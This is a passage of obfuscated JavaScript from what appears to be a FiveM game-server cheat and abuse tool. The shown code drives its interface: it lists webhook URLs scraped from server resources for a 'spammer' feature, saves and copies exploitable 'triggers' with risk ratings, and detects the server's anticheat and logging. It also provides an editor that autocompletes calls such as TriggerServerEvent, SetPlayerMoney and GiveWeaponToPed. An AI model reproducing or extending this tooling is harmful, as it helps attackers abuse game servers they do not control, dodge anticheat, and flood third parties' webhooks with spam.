        if (_0x36f0eb.target.checked) {
          if (!appState.selectedWebhooks.includes(_0x1ae835.url)) {
            appState.selectedWebhooks.push(_0x1ae835.url);
          }
        } else {
          appState.selectedWebhooks = appState.selectedWebhooks.filter(_0x144d7d => _0x144d7d !== _0x1ae835.url);
        }
        updateSelectedWebhooksList();
        updateSpammerSelectedWebhooks();
      });
      _0xb1fe98.appendChild(_0x1c87c8);
      validateWebhookStatus(_0x1ae835.url).then(_0x16c052 => {
        const _0x24f2f0 = document.getElementById("webhook-status-" + _0x4304be);
        if (_0x24f2f0) {
          _0x24f2f0.textContent = _0x16c052;
          _0x24f2f0.style.background = _0x16c052 === "Active" ? "#27ae60" : "#e74c3c";
        }
      });
    });
  } catch (_0x16363f) {
    console.error("Error updating webhooks table:", _0x16363f);
  }
}
function updateWebhookSelection(_0x5c42d8) {
  try {
    const _0x517e9e = document.getElementById("webhook-selection-list");
    if (!_0x517e9e) {
      return;
    }
    _0x517e9e.innerHTML = '';
    appState.selectedWebhooks = [];
    if (_0x5c42d8.length === 0x0 && appState.manualWebhooks.length === 0x0) {
      _0x517e9e.innerHTML = "<p style=\"color: #8b9dc3; text-align: center; font-size: 12px;\">No webhooks found from scan</p>";
      return;
    }
    _0x5c42d8.forEach((_0x10e6f9, _0x552a9f) => {
      const _0x30e8d0 = document.createElement("div");
      _0x30e8d0.className = 'webhook-item';
      _0x30e8d0.innerHTML = "\n                <input type=\"checkbox\" id=\"webhook-" + _0x552a9f + "\" data-url=\"" + _0x10e6f9.url + "\" data-type=\"scanned\">\n                <span class=\"webhook-url\">" + _0x10e6f9.url + "</span>\n            ";
      const _0x1d6e07 = _0x30e8d0.querySelector("input[type=\"checkbox\"]");
      _0x1d6e07.addEventListener("change", _0x5136fd => {
        if (_0x5136fd.target.checked) {
          appState.selectedWebhooks.push(_0x10e6f9.url);
          _0x30e8d0.classList.add("selected");
        } else {
          appState.selectedWebhooks = appState.selectedWebhooks.filter(_0x422960 => _0x422960 !== _0x10e6f9.url);
          _0x30e8d0.classList.remove("selected");
        }
      });
      _0x517e9e.appendChild(_0x30e8d0);
    });
    appState.manualWebhooks.forEach((_0x32fa2e, _0x5a0a98) => {
      const _0x3dee1e = document.createElement('div');
      _0x3dee1e.className = 'webhook-item';
      _0x3dee1e.innerHTML = "\n                <input type=\"checkbox\" id=\"manual-webhook-" + _0x5a0a98 + "\" data-url=\"" + _0x32fa2e.url + "\" data-type=\"manual\">\n                <span class=\"webhook-url\">" + _0x32fa2e.url + " (Manual)</span>\n            ";
      const _0x309e39 = _0x3dee1e.querySelector("input[type=\"checkbox\"]");
      _0x309e39.addEventListener("change", _0x43308d => {
        if (_0x43308d.target.checked) {
          appState.selectedWebhooks.push(_0x32fa2e.url);
          _0x3dee1e.classList.add("selected");
        } else {
          appState.selectedWebhooks = appState.selectedWebhooks.filter(_0x1e9886 => _0x1e9886 !== _0x32fa2e.url);
          _0x3dee1e.classList.remove("selected");
        }
      });
      _0x517e9e.appendChild(_0x3dee1e);
    });
  } catch (_0x5c0975) {
    console.error("Error updating webhook selection:", _0x5c0975);
  }
}
function updateSelectedWebhooksList() {
  try {
    const _0x556ea8 = document.getElementById("selected-webhooks-list");
    if (!_0x556ea8) {
      return;
    }
    _0x556ea8.innerHTML = '';
    if (appState.selectedWebhooks.length === 0x0) {
      _0x556ea8.innerHTML = "<p style=\"color: #8b9dc3; text-align: center; font-size: 12px;\">No webhooks selected</p>";
      return;
    }
    appState.selectedWebhooks.forEach((_0x4e3135, _0xcaf7fc) => {
      const _0x3018c1 = document.createElement("div");
      _0x3018c1.className = "selected-webhook-item";
      const _0x59a35c = appState.manualWebhooks.includes(_0x4e3135);
      const _0x4df6fc = _0x59a35c ? " (Manual)" : " (Scanned)";
      _0x3018c1.innerHTML = "\n                <span class=\"webhook-url\">" + _0x4e3135 + _0x4df6fc + "</span>\n                <button class=\"remove-btn\" onclick=\"removeSelectedWebhook('" + _0x4e3135 + "')\">\n                    <i class=\"fas fa-times\"></i>\n                </button>\n            ";
      _0x556ea8.appendChild(_0x3018c1);
    });
  } catch (_0x405e45) {
    console.error("Error updating selected webhooks list:", _0x405e45);
  }
}
function addManualWebhooksToSelection() {
  try {
    let _0x382b32 = 0x0;
    appState.manualWebhooks.forEach(_0x370acb => {
      if (!appState.selectedWebhooks.includes(_0x370acb)) {
        appState.selectedWebhooks.push(_0x370acb);
        _0x382b32++;
      }
    });
    if (_0x382b32 > 0x0) {
      updateSelectedWebhooksList();
      updateSpammerSelectedWebhooks();
      showNotification("Added " + _0x382b32 + " manual webhook(s) to selection", "success");
    } else {
      showNotification("All manual webhooks are already selected", 'info');
    }
  } catch (_0x2c7baa) {
    console.error("Error adding manual webhooks to selection:", _0x2c7baa);
    showNotification("Error adding manual webhooks to selection", "error");
  }
}
function removeSelectedWebhook(_0xcb0798) {
  try {
    appState.selectedWebhooks = appState.selectedWebhooks.filter(_0xa88d78 => _0xa88d78 !== _0xcb0798);
    const _0xc898ad = document.querySelector(".webhook-checkbox[data-url=\"" + _0xcb0798 + "\"]");
    if (_0xc898ad) {
      _0xc898ad.checked = false;
    }
    updateSelectedWebhooksList();
    updateSpammerSelectedWebhooks();
    showNotification("Webhook removed from selection", "success");
  } catch (_0x4768d0) {
    console.error("Error removing selected webhook:", _0x4768d0);
  }
}
function toggleWebhookSelection(_0x4dde51) {
  try {
    const _0x37dabe = appState.selectedWebhooks.includes(_0x4dde51);
    if (_0x37dabe) {
      appState.selectedWebhooks = appState.selectedWebhooks.filter(_0x2498f0 => _0x2498f0 !== _0x4dde51);
      showNotification("Webhook deselected", "info");
    } else {
      appState.selectedWebhooks.push(_0x4dde51);
      showNotification("Webhook selected", 'success');
    }
    updateSpammerSelectedWebhooks();
  } catch (_0x37cb6b) {
    console.error("Error toggling webhook selection:", _0x37cb6b);
  }
}
function removeWebhook(_0x42aae8) {
  try {
    appState.manualWebhooks = appState.manualWebhooks.filter(_0x256d68 => _0x256d68 !== _0x42aae8);
    appState.selectedWebhooks = appState.selectedWebhooks.filter(_0x157b24 => _0x157b24 !== _0x42aae8);
    updateManualWebhooksList();
    updateSpammerSelectedWebhooks();
    showNotification("Webhook removed", 'success');
  } catch (_0x3a3065) {
    console.error("Error removing webhook:", _0x3a3065);
  }
}
function selectAllWebhooks() {
  try {
    const _0x3c295a = document.querySelectorAll(".webhook-checkbox");
    appState.selectedWebhooks = [];
    _0x3c295a.forEach(_0x40dd7a => {
      _0x40dd7a.checked = true;
      const _0x5b3465 = _0x40dd7a.dataset.url;
      if (!appState.selectedWebhooks.includes(_0x5b3465)) {
        appState.selectedWebhooks.push(_0x5b3465);
      }
    });
    updateSelectedWebhooksList();
    updateSpammerSelectedWebhooks();
    showNotification("All webhooks selected", "success");
  } catch (_0x170d0a) {
    console.error("Error selecting all webhooks:", _0x170d0a);
  }
}
function clearWebhookSelection() {
  try {
    const _0x2cb022 = document.querySelectorAll(".webhook-checkbox");
    _0x2cb022.forEach(_0x1f379f => {
      _0x1f379f.checked = false;
    });
    appState.selectedWebhooks = [];
    updateSelectedWebhooksList();
    updateSpammerSelectedWebhooks();
    showNotification("Webhook selection cleared", "success");
  } catch (_0x243970) {
    console.error("Error clearing webhook selection:", _0x243970);
  }
}
function updateItemsTable(_0x105789 = null) {
  try {
    const _0x46e652 = document.getElementById('items-tbody');
    if (!_0x46e652) {
      return;
    }
    _0x46e652.innerHTML = '';
    const _0x1cfdc9 = _0x105789 || appState.scanResults.items;
    _0x1cfdc9.forEach((_0x536815, _0x2f361f) => {
      const _0x2a99a3 = document.createElement('tr');
      _0x2a99a3.setAttribute("data-item-name", _0x536815.name);
      _0x2a99a3.setAttribute("data-item-resource", _0x536815.resource || "unknown");
      if (_0x536815.imageUrl) {
        _0x2a99a3.innerHTML = "\n                    <td>\n                        <img src=\"" + _0x536815.imageUrl + "\" alt=\"" + _0x536815.name + "\" style=\"width: 32px; height: 32px; object-fit: contain; border-radius: 4px; border: 1px solid #333;\">\n                    </td>\n                    <td>" + _0x536815.name + "</td>\n                    <td>" + _0x536815.label + "</td>\n                    <td>\n                        <button class=\"copy-item-btn\" data-index=\"" + _0x2f361f + "\" style=\"padding: 4px 8px; background: #667eea; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Copy to Clipboard\">\n                            <i class=\"fas fa-copy\"></i>\n                        </button>\n                        <button class=\"preview-item-btn\" data-index=\"" + _0x2f361f + "\" style=\"padding: 4px 8px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\" title=\"Open in Preview\">\n                            <i class=\"fas fa-eye\"></i>\n                        </button>\n                    </td>\n                ";
      } else {
        _0x2a99a3.innerHTML = "\n                    <td>\n                        <div style=\"width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; background: #2a2a2a; border-radius: 4px; border: 1px solid #333;\">\n                            <span style=\"color: #667eea; font-weight: bold; font-size: 14px;\">" + _0x536815.name.charAt(0x0).toUpperCase() + "</span>\n                        </div>\n                    </td>\n                    <td>" + _0x536815.name + "</td>\n                    <td>" + _0x536815.label + "</td>\n                    <td>\n                        <button class=\"copy-item-btn\" data-index=\"" + _0x2f361f + "\" style=\"padding: 4px 8px; background: #667eea; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Copy to Clipboard\">\n                            <i class=\"fas fa-copy\"></i>\n                        </button>\n                        <button class=\"preview-item-btn\" data-index=\"" + _0x2f361f + "\" style=\"padding: 4px 8px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\" title=\"Open in Preview\">\n                            <i class=\"fas fa-eye\"></i>\n                        </button>\n                    </td>\n                ";
      }
      const _0x41a0d6 = _0x2a99a3.querySelector(".copy-item-btn");
      const _0x1a2df2 = _0x2a99a3.querySelector(".preview-item-btn");
      _0x41a0d6.addEventListener("click", () => {
        copyItemName(_0x536815.name);
      });
      _0x1a2df2.addEventListener("click", () => {
        openItemPreview(_0x536815.name, _0x536815.resource || "unknown");
      });
      _0x46e652.appendChild(_0x2a99a3);
    });
  } catch (_0x4d44da) {
    console.error("Error updating items table:", _0x4d44da);
  }
}
function updateCoordinatesTable(_0x27d404 = null) {
  try {
    const _0x73bcd1 = document.getElementById("coordinates-tbody");
    const _0x519c26 = document.getElementById("coordinates-empty");
    if (!_0x73bcd1) {
      return;
    }
    _0x73bcd1.innerHTML = '';
    const _0x508042 = _0x27d404 || appState.scanResults.coordinates;
    if (_0x508042.length === 0x0) {
      if (_0x519c26) {
        _0x519c26.style.display = "flex";
      }
      return;
    }
    if (_0x519c26) {
      _0x519c26.style.display = 'none';
    }
    _0x508042.forEach((_0x276506, _0x2ac0fc) => {
      const _0x3bfdab = document.createElement('tr');
      _0x3bfdab.setAttribute("data-coord-coordinates", _0x276506.coordinates);
      _0x3bfdab.setAttribute('data-coord-resource', _0x276506.resource);
      _0x3bfdab.setAttribute("data-coord-file", _0x276506.file);
      _0x3bfdab.setAttribute("data-coord-line", _0x276506.line);
      _0x3bfdab.setAttribute("data-coord-x", _0x276506.x);
      _0x3bfdab.setAttribute("data-coord-y", _0x276506.y);
      _0x3bfdab.setAttribute("data-coord-z", _0x276506.z);
      _0x3bfdab.setAttribute("data-coord-w", _0x276506.w);
      let _0xf472c1 = "#667eea";
      if (_0x276506.type === "vec4") {
        _0xf472c1 = "#e74c3c";
      } else if (_0x276506.type === "array") {
        _0xf472c1 = "#f39c12";
      }
      const _0x3cf6cd = _0x276506.nearItem ? "<br><small style=\"color: #27ae60;\">Near: " + _0x276506.nearItem + "</small>" : '';
      _0x3bfdab.innerHTML = "\n                <td>\n                    <span style=\"padding: 4px 8px; border-radius: 4px; font-size: 12px; background: " + _0xf472c1 + "; color: white;\">\n                        " + _0x276506.type.toUpperCase() + "\n                    </span>\n                </td>\n                <td style=\"font-family: 'Courier New', monospace; font-size: 12px;\">\n                    " + _0x276506.coordinates + "\n                    " + _0x3cf6cd + "\n                </td>\n                <td>" + _0x276506.resource + "</td>\n                <td style=\"font-size: 12px; color: #8b9dc3;\">" + _0x276506.file + "</td>\n                <td>" + _0x276506.line + "</td>\n                <td>\n                    <button class=\"copy-coord-btn\" data-index=\"" + _0x2ac0fc + "\" style=\"padding: 4px 8px; background: #667eea; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\">\n                        <i class=\"fas fa-copy\"></i>\n                    </button>\n                    <button class=\"view-coord-btn\" data-index=\"" + _0x2ac0fc + "\" style=\"padding: 4px 8px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\">\n                        <i class=\"fas fa-eye\"></i>\n                    </button>\n                    <button class=\"copy-coord-values-btn\" data-index=\"" + _0x2ac0fc + "\" style=\"padding: 4px 8px; background: #f39c12; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\">\n                        <i class=\"fas fa-plus\"></i>\n                    </button>\n                </td>\n            ";
      const _0xda6381 = _0x3bfdab.querySelector(".copy-coord-btn");
      const _0x4378d2 = _0x3bfdab.querySelector(".view-coord-btn");
      const _0x1a8748 = _0x3bfdab.querySelector(".copy-coord-values-btn");
      _0xda6381.addEventListener('click', () => {
        copyCoordinates(_0x276506.coordinates);
      });
      _0x4378d2.addEventListener("click", () => {
        viewCoordinates(_0x276506.resource, _0x276506.file, _0x276506.line);
      });
      _0x1a8748.addEventListener("click", () => {
        copyCoordinatesValues(_0x276506.x, _0x276506.y, _0x276506.z, _0x276506.w);
      });
      _0x73bcd1.appendChild(_0x3bfdab);
    });
  } catch (_0x284256) {
    console.error("Error updating coordinates table:", _0x284256);
  }
}
function getItemImagePath(_0x1a6781) {
  try {
    if (_0x1a6781.resource && _0x1a6781.resource.toLowerCase().includes('ox_inventory')) {
      const _0x5521fb = ["./ox_inventory/web/build/images/" + _0x1a6781.name + ".png", "./ox_inventory/web/build/images/" + _0x1a6781.name + ".jpg", "./ox_inventory/web/build/images/" + _0x1a6781.name + ".jpeg", "./ox_inventory/web/build/images/" + _0x1a6781.name + ".webp", "./ox_inventory/web/build/images/" + _0x1a6781.name + ".gif", "./ox_inventory/web/build/images/" + _0x1a6781.name.toUpperCase() + '.png', './ox_inventory/web/build/images/' + _0x1a6781.name.toUpperCase() + ".jpg", "./ox_inventory/web/build/images/" + _0x1a6781.name.toUpperCase() + '.jpeg', "./ox_inventory/web/build/images/" + _0x1a6781.name.toUpperCase() + ".webp", './ox_inventory/web/build/images/' + _0x1a6781.name.toUpperCase() + ".gif"];
      return _0x5521fb[0x0];
    }
    const _0x2c23f1 = ['./' + _0x1a6781.resource + "/images/" + _0x1a6781.name + '.png', './' + _0x1a6781.resource + "/images/" + _0x1a6781.name + ".jpg", './' + _0x1a6781.resource + '/web/images/' + _0x1a6781.name + ".png", './' + _0x1a6781.resource + '/web/images/' + _0x1a6781.name + ".jpg", './' + _0x1a6781.resource + "/html/images/" + _0x1a6781.name + ".png", './' + _0x1a6781.resource + "/html/images/" + _0x1a6781.name + '.jpg'];
    return _0x2c23f1[0x0];
  } catch (_0xa8b134) {
    console.error("Error getting item image path:", _0xa8b134);
    return "./ox_inventory/web/build/images/" + _0x1a6781.name + ".png";
  }
}
function updateAnticheatFromScan(_0x1bb417) {
  try {
    const _0x1ca996 = document.getElementById("anticheat-status");
    if (_0x1ca996) {
      if (_0x1bb417.length > 0x0) {
        const _0x57ff3a = [...new Set(_0x1bb417)];
        if (_0x57ff3a.length === 0x1) {
          _0x1ca996.textContent = "Anticheat: " + _0x57ff3a[0x0];
        } else {
          _0x1ca996.textContent = "Anticheats: " + _0x57ff3a.join(", ");
        }
      } else {
        _0x1ca996.textContent = "Anticheat: None detected";
      }
    }
  } catch (_0x3d6846) {
    console.error("Error updating anticheat from scan:", _0x3d6846);
  }
}
function updateLogsFromScan(_0x2f2ab7) {
  try {
    const _0x1ce670 = document.getElementById("logs-status");
    if (_0x1ce670) {
      if (_0x2f2ab7.length > 0x0) {
        _0x1ce670.textContent = "Logs: " + _0x2f2ab7[0x0];
      } else {
        _0x1ce670.textContent = "Logs: None detected";
      }
    }
  } catch (_0x1d0420) {
    console.error("Error updating logs from scan:", _0x1d0420);
  }
}
function saveTrigger(_0x3fad7c, _0x160bad, _0x42d370) {
  try {
    const _0x551870 = {
      'id': Date.now(),
      'resource': _0x3fad7c,
      'usage': _0x160bad,
      'risk': _0x42d370,
      'dateSaved': new Date().toISOString()
    };
    appState.savedTriggers.push(_0x551870);
    saveTriggersToLocalStorage();
    updateSavedTriggersList();
    updateStats();
    showNotification("Trigger saved", "success");
  } catch (_0x1e9129) {
    console.error("Error saving trigger:", _0x1e9129);
    showNotification("Error saving trigger", 'error');
  }
}
function copyTrigger(_0x4c5096) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(_0x4c5096);
      showNotification("Trigger copied to clipboard", "success");
    } else {
      const _0x31d63d = document.createElement("textarea");
      _0x31d63d.value = _0x4c5096;
      _0x31d63d.style.position = 'fixed';
      _0x31d63d.style.left = "-999999px";
      _0x31d63d.style.top = '-999999px';
      document.body.appendChild(_0x31d63d);
      _0x31d63d.focus();
      _0x31d63d.select();
      try {
        document.execCommand("copy");
        showNotification("Trigger copied to clipboard", 'success');
      } catch (_0x4fbccd) {
        showNotification("Please copy manually: " + _0x4c5096, "warning");
      }
      document.body.removeChild(_0x31d63d);
    }
  } catch (_0x41227c) {
    console.error("Error copying trigger:", _0x41227c);
    showNotification("Error copying trigger", "error");
  }
}
function viewTrigger(_0x3d20c4, _0x3029be, _0x113aee) {
  try {
    const _0x93b4d3 = document.querySelector(".resource-explorer");
    if (_0x93b4d3) {
      _0x93b4d3.scrollIntoView({
        'behavior': 'smooth'
      });
      navigateToFileInExplorer(_0x3029be, _0x3d20c4);
      showNotification("Navigating to " + _0x3029be + " in resource explorer", 'success');
    } else {
      showNotification("Viewing trigger: " + _0x3d20c4 + " in " + _0x3029be + ':' + _0x113aee, "info");
    }
  } catch (_0x41576e) {
    console.error("Error navigating to trigger file:", _0x41576e);
    showNotification("Viewing trigger: " + _0x3d20c4 + " in " + _0x3029be + ':' + _0x113aee, "info");
  }
}
function transferToEditor(_0x5144d7, _0x23a7a3) {
  try {
    switchTab("editor");
    const _0x1aa8e2 = document.getElementById("editor-trigger-text");
    if (_0x1aa8e2) {
      _0x1aa8e2.value = _0x5144d7;
      _0x1aa8e2.focus();
      const _0x15979a = document.getElementById('editor-resource-name');
      if (_0x15979a && _0x23a7a3) {
        _0x15979a.value = _0x23a7a3;
      }
      showNotification("Trigger transferred to editor", "success");
    } else {
      showNotification("Editor not found", "error");
    }
  } catch (_0x3a1460) {
    console.error("Error transferring to editor:", _0x3a1460);
    showNotification("Error transferring to editor", "error");
  }
}
function openTriggerPreview(_0x49c6f3, _0x29723a, _0x11e585) {
  try {
    const _0x3bc9b6 = document.querySelector('.resource-explorer');
    if (_0x3bc9b6) {
      _0x3bc9b6.scrollIntoView({
        'behavior': 'smooth'
      });
      navigateToFileInExplorer(_0x29723a, _0x49c6f3);
    }
    const _0x5c9340 = document.createElement("div");
    _0x5c9340.className = "file-viewer-modal";
    _0x5c9340.style.zIndex = "10000";
    const _0x55f905 = document.createElement("div");
    _0x55f905.className = "file-viewer-overlay";
    const _0x251a7a = document.createElement("div");
    _0x251a7a.className = "file-viewer-window";
    const _0x3732af = _0x29723a.split('/').pop() || _0x29723a;
    _0x251a7a.innerHTML = "\n            <div class=\"file-viewer-header\">\n                <div class=\"file-viewer-title\">\n                    <i class=\"fas fa-file-code\"></i>\n                    File Preview: " + _0x3732af + "\n                </div>\n                <div class=\"file-viewer-search\">\n                    <input type=\"text\" id=\"file-search-input\" placeholder=\"Search in file...\" />\n                    <div class=\"search-controls\">\n                        <button id=\"search-prev\" title=\"Previous match\">\n                            <i class=\"fas fa-chevron-up\"></i>\n                        </button>\n                        <button id=\"search-next\" title=\"Next match\">\n                            <i class=\"fas fa-chevron-down\"></i>\n                        </button>\n                        <span id=\"search-count\"></span>\n                    </div>\n                </div>\n                <button class=\"file-viewer-close\" id=\"close-preview\">\n                    <i class=\"fas fa-times\"></i>\n                </button>\n            </div>\n            <div class=\"file-viewer-content\">\n                <pre><code id=\"preview-code\">Loading file content...</code></pre>\n            </div>\n        ";
    _0x5c9340.appendChild(_0x55f905);
    _0x5c9340.appendChild(_0x251a7a);
    document.body.appendChild(_0x5c9340);
    const _0x2905df = _0x251a7a.querySelector("#close-preview");
    const _0x124416 = () => {
      document.body.removeChild(_0x5c9340);
    };
    _0x2905df.addEventListener("click", _0x124416);
    _0x55f905.addEventListener("click", _0x124416);
    const _0x2e0662 = _0x4c347d => {
      if (_0x4c347d.key === 'Escape') {
        _0x124416();
        document.removeEventListener("keydown", _0x2e0662);
      }
    };
    document.addEventListener('keydown', _0x2e0662);
    loadFileContentImproved(_0x29723a, _0x251a7a, _0x49c6f3);
    setupFileSearch(_0x251a7a);
    showNotification("Opening file preview", "info");
  } catch (_0x50a108) {
    console.error("Error opening file preview:", _0x50a108);
    showNotification("Error opening preview", "error");
  }
}
function loadFileContentImproved(_0x34fca6, _0x24c3c4, _0x2890c3) {
  try {
    const _0x56679c = _0x34fca6.split('/').pop() || _0x34fca6;
    let _0x3831ce = null;
    _0x3831ce = appState.selectedFiles.find(_0xb57f8f => _0xb57f8f.webkitRelativePath && _0xb57f8f.webkitRelativePath === _0x34fca6 || _0xb57f8f.webkitRelativePath && _0xb57f8f.webkitRelativePath.endsWith(_0x34fca6));
    if (!_0x3831ce && _0x2890c3) {
      _0x3831ce = appState.selectedFiles.find(_0x13562f => {
        const _0x24e57f = _0x13562f.webkitRelativePath || _0x13562f.name;
        return _0x24e57f.includes(_0x2890c3) && _0x24e57f.includes(_0x56679c) || _0x24e57f.includes(_0x2890c3) && _0x13562f.name === _0x56679c;
      });
    }
    if (!_0x3831ce) {
      _0x3831ce = appState.selectedFiles.find(_0x413845 => _0x413845.name === _0x56679c || _0x413845.webkitRelativePath && _0x413845.webkitRelativePath.includes(_0x34fca6) || _0x413845.webkitRelativePath && _0x413845.webkitRelativePath.endsWith(_0x34fca6) || (_0x413845.webkitRelativePath || "web_upload/" + _0x413845.name).includes(_0x34fca6) || (_0x413845.webkitRelativePath || 'web_upload/' + _0x413845.name).endsWith(_0x34fca6));
    }
    if (_0x3831ce) {
      const _0x1a75e7 = new FileReader();
      _0x1a75e7.onload = function (_0x40d49b) {
        const _0x46c004 = _0x40d49b.target.result;
        const _0x11bbcd = _0x24c3c4.querySelector('#preview-code');
        const _0x23db25 = _0x56679c.split('.').pop().toLowerCase();
        let _0x15bac7 = '';
        switch (_0x23db25) {
          case "lua":
            _0x15bac7 = highlightLua(_0x46c004);
            break;
          case 'js':
            _0x15bac7 = highlightJavaScript(_0x46c004);
            break;
          case "xml":
            _0x15bac7 = highlightXML(_0x46c004);
            break;
          case "json":
            _0x15bac7 = highlightJSON(_0x46c004);
            break;
          case "html":
            _0x15bac7 = highlightHTML(_0x46c004);
            break;
          case "css":
            _0x15bac7 = highlightCSS(_0x46c004);
            break;
          case "php":
            _0x15bac7 = highlightPHP(_0x46c004);
            break;
          case 'py':
            _0x15bac7 = highlightPython(_0x46c004);
            break;
          default:
            _0x15bac7 = escapeHtml(_0x46c004);
        }
        _0x11bbcd.innerHTML = _0x15bac7;
        showNotification("Successfully loaded file: " + _0x56679c, "success");
      };
      _0x1a75e7.readAsText(_0x3831ce);
    } else {
      const _0x1822d7 = _0x24c3c4.querySelector("#preview-code");
      _0x1822d7.innerHTML = "\n                <span style=\"color: #e74c3c;\">File not found in selected files</span>\n                <br><br>\n                <span style=\"color: #8b9dc3; font-size: 12px;\">\n                    Searched for: " + _0x56679c + "<br>\n                    Resource: " + (_0x2890c3 || "unknown") + "<br>\n                    Path: " + _0x34fca6 + "<br>\n                    Available files: " + appState.selectedFiles.length + "\n                </span>\n            ";
      showNotification("File not found: " + _0x56679c, 'warning');
    }
  } catch (_0x97b978) {
    console.error("Error loading file content:", _0x97b978);
    const _0x40ef26 = _0x24c3c4.querySelector("#preview-code");
    _0x40ef26.innerHTML = "\n            <span style=\"color: #e74c3c;\">Error loading file content</span>\n            <br><br>\n            <span style=\"color: #8b9dc3; font-size: 12px;\">\n                Error: " + _0x97b978.message + "<br>\n                File: " + _0x34fca6 + "<br>\n                Resource: " + (_0x2890c3 || "unknown") + "\n            </span>\n        ";
    showNotification("Error loading file: " + _0x97b978.message, "error");
  }
}
function testEditorSetup() {
  try {
    console.log("Testing editor setup...");
    const _0x4210f5 = {
      'triggerTab': document.getElementById('editor-tab-trigger'),
      'previewTab': document.getElementById('editor-tab-preview'),
      'triggerContent': document.getElementById("editor-trigger-content"),
      'previewContent': document.getElementById('editor-preview-content'),
      'previewLoadBtn': document.getElementById('editor-preview-load-btn'),
      'previewFilePath': document.getElementById("editor-preview-file-path"),
      'previewCode': document.getElementById('editor-preview-code'),
      'previewFileBtn': document.getElementById("editor-preview-file"),
      'testBtn': document.getElementById("editor-test"),
      'clearBtn': document.getElementById("editor-clear")
    };
    console.log("Editor elements found:", _0x4210f5);
    let _0x1499a6 = true;
    for (const [_0x2faf34, _0x3a911a] of Object.entries(_0x4210f5)) {
      if (!_0x3a911a) {
        console.error("Missing element: " + _0x2faf34);
        _0x1499a6 = false;
      }
    }
    if (_0x1499a6) {
      console.log("✅ All editor elements found");
      showNotification("Editor setup complete!", "success");
    } else {
      console.error("❌ Some editor elements missing");
      showNotification("Editor setup incomplete - check console", "warning");
    }
  } catch (_0x1d4fc7) {
    console.error("Error testing editor setup:", _0x1d4fc7);
    showNotification("Editor test failed: " + _0x1d4fc7.message, "error");
  }
}
function setupEditorAutoCompletion() {
  try {
    console.log("Setting up editor auto-completion...");
    const _0x4f9a72 = document.getElementById("editor-trigger-text");
    const _0x224ce9 = document.getElementById("editor-suggestions");
    if (!_0x4f9a72 || !_0x224ce9) {
      console.error("Auto-completion elements not found");
      return;
    }
    let _0x3397ed = [];
    let _0x7b5879 = 0x0;
    let _0x246d1b = false;
    const _0x163b5c = [{
      'text': "TriggerServerEvent",
      'icon': "fas fa-cube",
      'category': "event"
    }, {
      'text': "TriggerClientEvent",
      'icon': "fas fa-cube",
      'category': 'event'
    }, {
      'text': "RegisterCommand",
      'icon': "fas fa-terminal",
      'category': "command"
    }, {
      'text': "AddEventHandler",
      'icon': "fas fa-list",
      'category': 'event'
    }, {
      'text': 'Citizen.CreateThread',
      'icon': "fas fa-code",
      'category': "thread"
    }, {
      'text': "Citizen.Wait",
      'icon': "fas fa-clock",
      'category': "utility"
    }, {
      'text': "GetPlayerPed",
      'icon': "fas fa-user",
      'category': "player"
    }, {
      'text': "GetEntityCoords",
      'icon': "fas fa-map-marker-alt",
      'category': "entity"
    }, {
      'text': "GetPlayerServerId",
      'icon': "fas fa-id-card",
      'category': "player"
    }, {
      'text': "GetPlayerName",
      'icon': "fas fa-user-tag",
      'category': "player"
    }, {
      'text': "SetEntityCoords",
      'icon': "fas fa-map-marker-alt",
      'category': "entity"
    }, {
      'text': "CreateObject",
      'icon': "fas fa-cube",
      'category': "object"
    }, {
      'text': 'DeleteObject',
      'icon': "fas fa-trash",
      'category': 'object'
    }, {
      'text': "CreateVehicle",
      'icon': "fas fa-car",
      'category': "vehicle"
    }, {
      'text': "DeleteVehicle",
      'icon': "fas fa-car",
      'category': "vehicle"
    }, {
      'text': "SetVehicleNumberPlateText",
      'icon': "fas fa-car",
      'category': "vehicle"
    }, {
      'text': "GetVehiclePedIsIn",
      'icon': "fas fa-car",
      'category': "vehicle"
    }, {
      'text': "IsPedInVehicle",
      'icon': "fas fa-car",
      'category': "vehicle"
    }, {
      'text': "GiveWeaponToPed",
      'icon': "fas fa-gun",
      'category': 'weapon'
    }, {
      'text': "RemoveWeaponFromPed",
      'icon': "fas fa-gun",
      'category': 'weapon'
    }, {
      'text': "SetPedArmour",
      'icon': "fas fa-shield-alt",
      'category': 'player'
    }, {
      'text': "GetPedArmour",
      'icon': "fas fa-shield-alt",
      'category': "player"
    }, {
      'text': 'SetPlayerHealth',
      'icon': "fas fa-heart",
      'category': 'player'
    }, {
      'text': 'GetPlayerHealth',
      'icon': "fas fa-heart",
      'category': "player"
    }, {
      'text': 'SetPlayerMoney',
      'icon': "fas fa-dollar-sign",
      'category': 'player'
    }, {
      'text': "GetPlayerMoney",
      'icon': "fas fa-dollar-sign",
      'category': "player"
    }, {
      'text': "ShowNotification",
      'icon': "fas fa-bell",
      'category': 'ui'
    }, {
      'text': "DrawText3D",
      'icon': "fas fa-text-height",
      'category': 'ui'
    }, {
      'text': "DrawMarker",
      'icon': "fas fa-map-pin",
      'category': 'ui'
    }, {
      'text': 'CreateBlip',
      'icon': "fas fa-map-marker",
      'category': 'blip'
    }, {
      'text': "RemoveBlip",
      'icon': "fas fa-map-marker",
      'category': "blip"
    }, {
      'text': "SetBlipCoords",
      'icon': "fas fa-map-marker",
      'category': 'blip'
    }, {
      'text': "SetBlipSprite",
      'icon': "fas fa-map-marker",
      'category': "blip"
    }, {
      'text': "SetBlipColour",
      'icon': "fas fa-palette",
      'category': "blip"
    }, {
      'text': "SetBlipScale",
      'icon': "fas fa-expand",
      'category': 'blip'
    }, {
      'text': "SetBlipAsShortRange",
      'icon': "fas fa-map-marker",
      'category': "blip"
    }, {
      'text': "BeginTextCommandDisplayHelp",
      'icon': "fas fa-question-circle",
      'category': 'ui'
    }, {
      'text': 'AddTextComponentSubstringPlayerName',
      'icon': "fas fa-user",
      'category': 'ui'
    }, {
      'text': "EndTextCommandDisplayHelp",
      'icon': "fas fa-question-circle",
      'category': 'ui'
    }, {
      'text': 'BeginTextCommandDisplayText',
